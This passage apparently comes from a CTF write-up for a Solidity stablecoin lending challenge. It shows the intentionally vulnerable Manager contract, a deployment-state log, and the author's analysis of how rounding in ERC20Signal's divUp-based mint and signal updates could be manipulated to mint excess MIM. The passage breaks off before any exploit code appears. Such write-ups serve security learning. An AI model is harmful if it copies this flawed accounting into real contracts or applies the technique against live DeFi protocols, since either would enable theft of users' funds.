</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateral </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>InvalidPosition</span><span>();
</span><span>            }
</span><span>            </span><span style=color:#62a35c>_closePosition</span><span>(protocolCollateralToken, protocolDebtToken, </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>false</span><span>);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#62a35c>_checkPosition</span><span>(token, debt, collateral);
</span><span>
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(debtBefore </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>                positionCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>=</span><span> token;
</span><span>            }
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(collateralDelta, debtDelta);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>liquidate</span><span>(</span><span style=color:#0086b3>address </span><span>liquidatee) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token </span><span style=color:#a71d5d;font-weight:700>=</span><span> positionCollateral[liquidatee];
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#0086b3>address</span><span>(token) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>NothingToLiquidate</span><span>();
</span><span>        }
</span><span>
</span><span>        Collateral </span><span style=color:#a71d5d;font-weight:700>memory </span><span>collateralTokenInfo </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralData[token];
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolCollateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralTokenInfo.protocolCollateralToken;
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolDebtToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralTokenInfo.protocolDebtToken;
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> wholeCollateral </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(liquidatee);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> wholeDebt </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(liquidatee);
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> price,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralTokenInfo.priceFeed.</span><span style=color:#62a35c>fetchPrice</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> health </span><span style=color:#a71d5d;font-weight:700>=</span><span> ProtocolMath.</span><span style=color:#62a35c>_computeHealth</span><span>(wholeCollateral, wholeDebt, price);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(health </span><span style=color:#a71d5d;font-weight:700>>=</span><span> MIN_CR) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>NothingToLiquidate</span><span>();
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalDebt </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolDebtToken.</span><span style=color:#62a35c>totalSupply</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(wholeDebt </span><span style=color:#a71d5d;font-weight:700>==</span><span> totalDebt) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>CannotLiquidateLastPosition</span><span>();
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>(health </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> ProtocolMath.ONE)) {
</span><span>            mim.</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, wholeDebt);
</span><span>            totalDebt </span><span style=color:#a71d5d;font-weight:700>-=</span><span> wholeDebt;
</span><span>        }
</span><span>
</span><span>        token.</span><span style=color:#62a35c>safeTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, wholeCollateral);
</span><span>
</span><span>        </span><span style=color:#62a35c>_closePosition</span><span>(protocolCollateralToken, protocolDebtToken, liquidatee, </span><span style=color:#0086b3>true</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>_updateSignals</span><span>(token, protocolCollateralToken, protocolDebtToken, totalDebt);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addCollateralToken</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token, PriceFeed priceFeed, </span><span style=color:#0086b3>uint256 </span><span>collateralSignal, </span><span style=color:#0086b3>uint256 </span><span>debtSignal)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>external
</span><span>        </span><span style=color:#a71d5d;font-weight:700>onlyOwner
</span><span>    {
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolCollateralToken </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#0086b3>ERC20Signal</span><span>(
</span><span>            </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>),
</span><span>            collateralSignal,
</span><span>            </span><span style=color:#0086b3>string</span><span>(</span><span style=color:#0086b3>bytes</span><span>.</span><span style=color:#62a35c>concat</span><span>(</span><span style=color:#183691>"MIM "</span><span>, </span><span style=color:#0086b3>bytes</span><span>(</span><span style=color:#0086b3>IERC20Metadata</span><span>(</span><span style=color:#0086b3>address</span><span>(token)).</span><span style=color:#62a35c>name</span><span>()), </span><span style=color:#183691>" collateral"</span><span>)),
</span><span>            </span><span style=color:#0086b3>string</span><span>(</span><span style=color:#0086b3>bytes</span><span>.</span><span style=color:#62a35c>concat</span><span>(</span><span style=color:#183691>"mim"</span><span>, </span><span style=color:#0086b3>bytes</span><span>(</span><span style=color:#0086b3>IERC20Metadata</span><span>(</span><span style=color:#0086b3>address</span><span>(token)).</span><span style=color:#62a35c>symbol</span><span>()), </span><span style=color:#183691>"-c"</span><span>))
</span><span>        );
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolDebtToken </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#0086b3>ERC20Signal</span><span>(
</span><span>            </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>),
</span><span>            debtSignal,
</span><span>            </span><span style=color:#0086b3>string</span><span>(</span><span style=color:#0086b3>bytes</span><span>.</span><span style=color:#62a35c>concat</span><span>(</span><span style=color:#183691>"MIM "</span><span>, </span><span style=color:#0086b3>bytes</span><span>(</span><span style=color:#0086b3>IERC20Metadata</span><span>(</span><span style=color:#0086b3>address</span><span>(token)).</span><span style=color:#62a35c>name</span><span>()), </span><span style=color:#183691>" debt"</span><span>)),
</span><span>            </span><span style=color:#0086b3>string</span><span>(</span><span style=color:#0086b3>bytes</span><span>.</span><span style=color:#62a35c>concat</span><span>(</span><span style=color:#183691>"mim"</span><span>, </span><span style=color:#0086b3>bytes</span><span>(</span><span style=color:#0086b3>IERC20Metadata</span><span>(</span><span style=color:#0086b3>address</span><span>(token)).</span><span style=color:#62a35c>symbol</span><span>()), </span><span style=color:#183691>"-d"</span><span>))
</span><span>        );
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#0086b3>address</span><span>(collateralData[token].protocolCollateralToken) </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>CollateralTokenAlreadyAdded</span><span>();
</span><span>        }
</span><span>
</span><span>        Collateral </span><span style=color:#a71d5d;font-weight:700>memory </span><span>protocolCollateralTokenInfo;
</span><span>        protocolCollateralTokenInfo.protocolCollateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolCollateralToken;
</span><span>        protocolCollateralTokenInfo.protocolDebtToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolDebtToken;
</span><span>        protocolCollateralTokenInfo.priceFeed </span><span style=color:#a71d5d;font-weight:700>=</span><span> priceFeed;
</span><span>
</span><span>        collateralData[token] </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolCollateralTokenInfo;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateDebt</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token, </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolDebtToken, </span><span style=color:#0086b3>uint256 </span><span>debtDelta, </span><span style=color:#0086b3>bool </span><span>debtIncrease) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(debtDelta </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(debtIncrease) {
</span><span>            </span><span style=color:#62a35c>_decayRate</span><span>(token);
</span><span>
</span><span>            protocolDebtToken.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, debtDelta);
</span><span>            mim.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, debtDelta);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            protocolDebtToken.</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, debtDelta);
</span><span>            mim.</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, debtDelta);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateCollateral</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolCollateralToken,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>collateralDelta,
</span><span>        </span><span style=color:#0086b3>bool </span><span>collateralIncrease
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralDelta </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralIncrease) {
</span><span>            protocolCollateralToken.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>            token.</span><span style=color:#62a35c>safeTransferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), collateralDelta);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            protocolCollateralToken.</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>            token.</span><span style=color:#62a35c>safeTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateSignals</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolCollateralToken,
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolDebtToken,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>totalDebtForCollateral
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        protocolDebtToken.</span><span style=color:#62a35c>setSignal</span><span>(totalDebtForCollateral);
</span><span>        protocolCollateralToken.</span><span style=color:#62a35c>setSignal</span><span>(token.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updateSignal</span><span>(</span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>token, </span><span style=color:#0086b3>uint256 </span><span>signal) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>        token.</span><span style=color:#62a35c>setSignal</span><span>(signal);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_closePosition</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolCollateralToken,
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolDebtToken,
</span><span>        </span><span style=color:#0086b3>address </span><span>position,
</span><span>        </span><span style=color:#0086b3>bool </span><span>burn
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        positionCollateral[position] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(</span><span style=color:#0086b3>address</span><span>(0));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(burn) {
</span><span>            protocolDebtToken.</span><span style=color:#62a35c>burn</span><span>(position, </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>            protocolCollateralToken.</span><span style=color:#62a35c>burn</span><span>(position, </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_decayRate</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> decayedRate </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_calcDecayedRate</span><span>(token);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(decayedRate </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> ProtocolMath.ONE);
</span><span>
</span><span>        collateralData[token].baseRate </span><span style=color:#a71d5d;font-weight:700>=</span><span> decayedRate;
</span><span>
</span><span>        </span><span style=color:#62a35c>_updateOperationTime</span><span>(token);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateOperationTime</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> pastTime </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>timestamp -</span><span> collateralData[token].operationTime;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(1 minutes &lt;= pastTime) {
</span><span>            collateralData[token].operationTime </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>timestamp</span><span>;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_calcDecayedRate</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token) </span><span style=color:#a71d5d;font-weight:700>internal view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#0086b3>uint256</span><span> pastMinutes </span><span style=color:#a71d5d;font-weight:700>= </span><span>(</span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>timestamp -</span><span> collateralData[token].operationTime) </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1 minutes;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> decay </span><span style=color:#a71d5d;font-weight:700>=</span><span> ProtocolMath.</span><span style=color:#62a35c>_decPow</span><span>(DECAY_FACTOR, pastMinutes);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> collateralData[token].baseRate.</span><span style=color:#62a35c>mulDown</span><span>(decay);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_checkPosition</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token, </span><span style=color:#0086b3>uint256 </span><span>debt, </span><span style=color:#0086b3>uint256 </span><span>collateral) </span><span style=color:#a71d5d;font-weight:700>internal view </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(debt </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> MIN_DEBT) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>NetDebtBelowMinimum</span><span>(debt);
</span><span>        }
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> price,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralData[token].priceFeed.</span><span style=color:#62a35c>fetchPrice</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> health </span><span style=color:#a71d5d;font-weight:700>=</span><span> ProtocolMath.</span><span style=color:#62a35c>_computeHealth</span><span>(collateral, debt, price);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(health </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> MIN_CR) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>NewICRLowerThanMCR</span><span>(health);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>receive</span><span>() </span><span style=color:#a71d5d;font-weight:700>external payable </span><span>{}
</span><span>}
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Stablecoin </span><span>{
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>mim;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>eth;
</span><span>    Manager </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>manager;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_player, Token _mim, Token _eth, Manager _manager) {
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>        mim </span><span style=color:#a71d5d;font-weight:700>=</span><span> _mim;
</span><span>        eth </span><span style=color:#a71d5d;font-weight:700>=</span><span> _eth;
</span><span>        manager </span><span style=color:#a71d5d;font-weight:700>=</span><span> _manager;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> mim.</span><span style=color:#62a35c>balanceOf</span><span>(player) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>50_000_000 ether</span><span>;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-5>Solution</h2><p>Bro, this is pain I couldn't remember what I did to solve this. Spent more than 3 days (I know I'm dumb). By doing some magic I was to solve this in the end. I'll try my best to explain that magic.<p>Lets break down the StableCoin protocol,<ol><li><p><strong>Manager (Main Contract)</strong></p> <ul><li>Handles adding collateral tokens, managing positions, and liquidations<li>Maintains collateral and debt signals for each position<li>Controls the MIM token minting and burning<li>Key functions: <ul><li><code>manage()</code>: Add/remove collateral and debt<li><code>liquidate()</code>: Liquidate undercollateralized positions<li><code>addCollateralToken()</code>: Add new collateral types<li><code>updateSignal()</code>: Update collateral/debt signals</ul></ul><li><p><strong>Token</strong></p> <ul><li>ERC20 token contract for MIM stablecoin<li>Can only be minted/burned by the Manager</ul><li><p><strong>ERC20Signal</strong></p> <ul><li>Special ERC20 implementation for protocol collateral and debt tokens<li>Uses a signal multiplier for balance calculations<li>Cannot be transferred (all transfer functions revert)<li>Key functions: <ul><li><code>mint()</code>: Mints tokens with signal adjustment<li><code>burn()</code>: Burns tokens with signal adjustment<li><code>setSignal()</code>: Updates the signal multiplier</ul></ul><li><p><strong>PriceFeed</strong></p> <ul><li>Simple price oracle that returns fixed prices<li>Returns (2207 ether, 0.01 ether) for price and timestamp</ul><li><p><strong>Stablecoin</strong></p> <ul><li>Challenge contract that sets up the initial state<li>Holds references to MIM, ETH tokens, and Manager</ul></ol><p>The goal is to get 50,000,000 MIM tokens when starting with 6000 ETH.<p>The Manager owner did the following after protocol deployement,<ol><li>The protocol adds ETH as collateral with a simple price feed and very high limits<li>Creates an initial position with 2 ETH collateral and 3395 MIM debt<li>Updates the debt token's signal to 3520 ether (this affects debt calculations)</ol><p>Same routene, initial state of the protocol.<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>  Stablecoin :  0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9
</span><span>  Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
</span><span>  Manager Owner:  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
</span><span>  MIM :  0x7a2B13B63367219128DD46d1ab179a542C17d48a
</span><span>  MIM Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
</span><span>  ETH :  0xc673093EC4446A0690Aeb98105faeB8528c50693
</span><span>  ETH Manager :  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
</span><span>  protocolCollateralToken :  0xfe49524fEe1b2FeF5Dff149B1A0370cff0d68972
</span><span>  protocolCollateralToken Signal:  20000000000000000000000000000000000
</span><span>  protocolCollateralToken totalSupply()</span><span style=color:#62a35c>:</span><span>  2000000000000000000
</span><span>  protocolDebtToken :  0x89cAaD14ca4eEA0272A2654A31A56D0a509E28fF
</span><span>  protocolDebtToken Signal :  1036818851251840943
</span><span>  protocolDebtToken totalSupply()</span><span style=color:#62a35c>:</span><span>  3520000000000000001485
</span><span>  -------------------------------
</span><span>  Manager balance of ETH :  2000000000000000000
</span><span>  Manager balance of MIM :  0
</span><span>  Manager Owner balance of ETH :  0
</span><span>  Manager Owner balance of MIM :  3395000000000000000000
</span><span>  Manager Owner balance of protocolCollateralToken :  2000000000000000000
</span><span>  Manager Owner balance of protocolDebtToken :  3520000000000000001485
</span><span>  Player balance of ETH :  6000000000000000000000
</span><span>  Player balance of MIM :  0
</span><span>  Player balance of protocolCollateralToken :  0
</span><span>  Player balance of protocolDebtToken :  0
</span><span>  protocolCollateralToken Signal:  20000000000000000000000000000000000
</span><span>  protocolDebtToken Signal :  1036818851251840943
</span></code></pre><p>When the Manager owner added the collatoral token as ETH, <code>protocolCollateralToken</code> and <code>protocolDebtToken</code> will be deployed. And curresponding signal values are added by the owner.<p>Lets do the backtracking, our goal is to get the MIM tokens, where the transfer/mint of MIM happens? In the <code>_updateDebt()</code> internal function which is called at once in <code>manage()</code>.<p>So, need to understand what does this <code>manage()</code> function do. When called, it can either add or remove ETH collateral and mint or burn MIM tokens. When adding collateral, it transfers ETH from the user to the Manager and mints protocolCollateralToken to the user. When minting MIM, it creates new MIM tokens and mints protocolDebtToken to track the debt. The function uses a signal-based system where both collateral and debt tokens have signal multipliers that affect the actual balances and health calculations. The protocol checks the position's health factor after each operation to ensure proper collateralization.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateCollateral</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>        </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolCollateralToken,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>collateralDelta,
</span><span>        </span><span style=color:#0086b3>bool </span><span>collateralIncrease
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralDelta </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralIncrease) {
</span><span>            protocolCollateralToken.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>            token.</span><span style=color:#62a35c>safeTransferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), collateralDelta);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            protocolCollateralToken.</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>            token.</span><span style=color:#62a35c>safeTransfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralDelta);
</span><span>        }
</span><span>    }
</span></code></pre><p>If we observe here, While adding collatoral the collatoral token will be transferred from user to Manager and the <code>protocolCollateralToken</code> is also minted to track the user collatoral amount. And this collatoral amount will affects the health of the user. If we closely look at the <code>protocolCollateralToken.mint(msg.sender, collateralDelta)</code> line.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>    </span><span style=color:#62a35c>_mint</span><span>(to, amount.</span><span style=color:#62a35c>divUp</span><span>(signal));
</span><span>}
</span></code></pre><p>Hmm, something is interesting, its not the usual mint. mint amount is calculated by doing <code>divUp</code> with the <code>signal</code>. So, can we make this <code>divUp()</code> calculation to result very large amount so that our <code>protocolCollatoralToken</code> coallatoral will be high and we can get more <code>mim</code> tokens due to increase of collatoral and health factor.<p>Okay, now how can we do this? By modifying the <code>signal</code> value.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// Manager
</span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_updateSignals</span><span>(
</span><span>    </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>    </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolCollateralToken,
</span><span>    </span><span style=color:#a71d5d;font-weight:700>ERC20Signal </span><span>protocolDebtToken,
</span><span>    </span><span style=color:#0086b3>uint256 </span><span>totalDebtForCollateral
</span><span>) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>    protocolDebtToken.</span><span style=color:#62a35c>setSignal</span><span>(totalDebtForCollateral);
</span><span>    protocolCollateralToken.</span><span style=color:#62a35c>setSignal</span><span>(token.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>// ERC20Signal 
</span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setSignal</span><span>(</span><span style=color:#0086b3>uint256 </span><span>backingAmount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
